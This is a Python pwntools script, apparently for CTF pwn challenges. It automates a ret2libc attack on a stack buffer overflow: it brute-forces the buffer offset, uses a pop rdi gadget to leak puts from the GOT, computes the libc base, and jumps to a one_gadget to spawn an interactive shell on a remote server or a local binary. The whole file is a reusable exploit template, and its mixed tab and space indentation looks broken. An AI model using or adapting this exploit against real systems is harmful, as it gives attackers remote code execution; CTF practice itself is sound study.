#!/usr/bin/env python
#-*-coding:utf8-*-
from pwn import *

#context.log_level = "debug"
IP = "pwn.koreahacker.kro.kr"
PORT = "12370"
#r = remote(IP, PORT)
#r = process("./challenge")
e = ELF("./challenge")

print('=================================')
print('Change the binary name to challenge!')
print('example')
print('puts leak: 1')
print('write/read leak: 2')
print('libc csu init leak: 3')
print('=================================')

choice = input('your want exploit shape: ')

def puts_exploit():
	pop_rdi = input('pop rdi gadget: ')
        ret = input('return address: ')
        puts_plt = e.plt["puts"]
        puts_got = e.got["puts"]
        main = e.symbols["main"]

	print 'remote: 1, local: 2'
	rl = input('remote and local: ')
	if(rl == 1):
		one = input('ubuntu version 16.04 = 1, 18.04 = 2: ')
        	if(one == 1):
                	libc = e.libc
                	one_gadget = 0x4526a
        	elif(one == 2):
                	libc = ELF("libc-2.27.so")
                	one_gadget = 0x4f322

		for i in range(0, 500):
			r = remote(IP, PORT)

			payload = "A"*(int(i))
			payload += p64(pop_rdi)
			payload += p64(puts_got)
			payload += p64(puts_plt)
			payload += p64(main)
			r.sendline(payload)

			try:
				puts_leak = u64(r.recvuntil("\x7f")[-6:] + "\x00\x00")
				base = puts_leak - libc.symbols["puts"]
				#system = base + libc.symbols["system"]
				#binsh = base + libc.search("/bin/sh").next()
				oneshot = base + one_gadget

				info("buffer size = " + str(i))
       	 			info("puts leak = " + hex(puts_leak))
       	 			info("base addr = " + hex(base))
				info("oneshot addr = " + hex(oneshot))

		        	payload = "B"*(int(i))
				payload += p64(oneshot)
				payload += p64(0) * 10
        			r.sendline(payload)
        			r.interactive()
				break
			except:
				print ("Fail: " + str(i))
			r.close()

	elif(rl == 2):
        	one = input('ubuntu version 16.04 = 1, 18.04 = 2: ')
        	if(one == 1):
                	libc = e.libc
                	one_gadget = 0x4526a
        	elif(one == 2):
                	libc = ELF("libc-2.27.so")
                	one_gadget = 0x4f322

                for i in range(0, 500):
                        r = process("./challenge")

                        payload = "A"*(int(i))
                        payload += p64(pop_rdi)
                        payload += p64(puts_got)
                        payload += p64(puts_plt)
                        payload += p64(main)
                        r.sendline(payload)

                        try:
                                puts_leak = u64(r.recvuntil("\x7f")[-6:] + "\x00\x00")
                                base = puts_leak - libc.symbols["puts"]
                                oneshot = base + one_gadget

                                info("buffer size = " + str(i))
                                info("puts leak = " + hex(puts_leak))
                                info("base addr = " + hex(base))
                                info("oneshot addr = " + hex(oneshot))

                                payload = "B"*(int(i))
                                payload += p64(oneshot)
                                payload += p64(0) * 10
                                r.sendline(payload)
                                r.interactive()
                                break
                        except:
                                print ("Fail: " + str(i))
                        r.close()

if(choice == 1):
	puts_exploit()
else:
	exit()
